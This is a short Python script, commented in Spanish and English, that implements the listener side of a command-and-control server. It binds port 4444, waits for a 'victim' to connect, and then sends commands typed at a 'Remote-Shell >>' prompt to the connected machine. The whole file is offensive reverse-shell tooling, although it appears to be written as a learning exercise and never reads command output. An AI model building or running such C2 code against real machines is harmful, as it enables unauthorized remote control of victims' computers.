import socket

# '0.0.0.0' significa "Escuchar en todas las interfaces de red de este PC"
HOST = '0.0.0.0' 
PORT = 4444

def init_server():
    print(f"\n[+] Configurando el Servidor C2 en el puerto {PORT}...")
    # Create a TCP Socket
    #AF_INET specifies IPv4
    #SOCK_STREAM specifies TCP
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1) # Listen for incoming connections (max 1 connection in the queue because of the argument number 1)
    print(f"[+] Servidor LISTO. Esperando a que la víctima se conecte...")

    conn, addr = server.accept() # Accept an incoming connection
    # conn is the socket object to communicate with the client
    # addr is the address of the client
    print(f"\n[V] ¡CONEXIÓN ESTABLECIDA CON {addr[0]}!")
    print("-" * 50)

    while True:
        # a. Pedir al atacante qué quiere hacer
        command = input("Remote-Shell >> ")
        #Sockets only send Bytes
        #encode tranforms the Strings into Byte
        if command.lower() == "exit":
            conn.send('exit'.encode())
            break
        
        if command.strip() == "":
            continue

        conn.send(command.encode())
        #Terminat el codigo del erver

if __name__ == '__main__':
    init_server()